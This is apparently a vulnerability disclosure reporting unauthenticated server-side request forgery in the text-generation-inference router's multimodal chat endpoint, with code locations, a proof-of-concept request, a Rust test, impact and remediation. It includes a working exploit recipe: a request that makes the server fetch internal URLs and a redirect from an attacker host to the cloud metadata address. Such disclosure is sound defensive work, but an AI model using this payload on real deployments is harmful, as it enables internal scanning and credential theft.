https://github.com/huggingface/text-generation-inference - "This repository was archived by the owner on Mar 21, 2026. It is now read-only."

## Finding: Unauthenticated server-side request forgery via image_url in the OpenAI-compatible chat endpoint

Package: text-generation-inference (TGI router)

Affected Versions: confirmed on current main

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5 High)

CWE: CWE-918 Server-Side Request Forgery

### Summary

The TGI router fetches the `image_url` supplied in a multimodal `/v1/chat/completions` request server-side, with no validation of the target host beyond an `http(s)://` prefix check. There is no filtering of loopback, private, link-local, or cloud-metadata addresses, and `reqwest`'s default redirect-following allows an `https://` URL to redirect to such a target. Because the router binds `0.0.0.0` by default and runs without authentication when no API key is set, any unauthenticated client that can reach a TGI instance serving a vision model can make the server issue requests to internal services and cloud metadata endpoints. Confirmed end to end by invoking the `fetch_image` function, which issued a request to an attacker-chosen internal URL.

### Details

In `router/src/validation.rs`, `fetch_image` performs the fetch:

```rust
// ~line 574: only guard is a literal scheme prefix check
// ~line 576:
let response = reqwest::blocking::get(url)?;
```

The request path: a chat message content part `{"type":"image_url","image_url":{"url":"<url>"}}` is formatted verbatim as `![](<url>)` (`router/src/lib.rs`, the url is a raw `String` with no URL-type validation), captured by the regex `!\[\]\([^\)]*\)` (`validation.rs` ~line 823), and passed to `fetch_image` (~line 840). No internal/loopback/metadata filtering exists anywhere in `router/src`. `reqwest` 0.11 follows up to 10 redirects by default and `fetch_image` sets no custom redirect policy, so an `https://attacker/` URL that returns a 302 to `http://169.254.169.254/...` reaches cloud metadata despite the scheme check.

Default exposure is unauthenticated: the launcher binds `0.0.0.0` (`launcher/src/main.rs`, `hostname` default `0.0.0.0`), and the router installs the auth middleware only when an API key is configured (`router/src/server.rs`, `api_key: Option<String>` defaulting to `None`).

### PoC

HTTP reproduction. Serve a vision model with the defaults (`text-generation-launcher --model-id <vision-model>`; default bind `0.0.0.0`, no `--api-key`), start a listener you control (`nc -lk 127.0.0.1 8123` or a small HTTP server), then send the unauthenticated request:

```
POST /v1/chat/completions
{"model":"x","messages":[{"role":"user","content":[
  {"type":"text","text":"hi"},
  {"type":"image_url","image_url":{"url":"http://127.0.0.1:8123/ssrf-canary"}}]}]}
```

The server issues a server-side GET to `http://127.0.0.1:8123/ssrf-canary` (your listener logs the inbound request). Because `reqwest` follows redirects by default and the only guard is the `http(s)://` prefix check (`router/src/validation.rs:574`), an `https://attacker/x` that returns `302 Location: http://169.254.169.254/latest/meta-data/...` reaches the cloud metadata service.

Source-level validation used to confirm the fetch without a model: add a throwaway test in the `validation` test module that calls the private `fetch_image` with the markdown-image input format and asserts the listener is hit:

```rust
#[test]
fn poc_ssrf() {
    //  private function in router/src/validation.rs
    let _ = fetch_image("![](http://127.0.0.1:8123/ssrf-canary)");
    // run `nc -lk 127.0.0.1 8123` first; the  reqwest::blocking::get fires the GET
}
```

Observed: the `reqwest::blocking::get` issued the GET to the local internal listener (listener logged the inbound request). Source confirms default bind `0.0.0.0` (launcher `main.rs`), `api_key` default `None` / no auth (`server.rs`), and default redirect following.

### Impact

An unauthenticated network client of a TGI instance serving any vision model can coerce the server into making HTTP requests to internal-only services and to cloud instance-metadata endpoints, and use redirects to bypass the scheme check. This enables internal port scanning, reaching internal admin/services, and hitting metadata endpoints (credential theft) from the TGI host. The image must ultimately decode for a fully successful response, so this is best characterized as blind/semi-blind SSRF (reachability, timing/error differentiation, and metadata/internal hits), which is still a valid unauthenticated SSRF on the default configuration.

### Remediation

Before fetching, parse the URL and reject non-public targets: resolve the host and deny loopback, RFC1918 private, link-local (169.254.0.0/16, fe80::/10), unique-local, and other reserved ranges plus cloud-metadata hostnames; enforce an http/https allowlist; and set an explicit redirect policy that re-validates each hop's resolved IP (or disable redirects). Consider requiring authentication by default, or gating server-side image fetching behind an explicit opt-in.
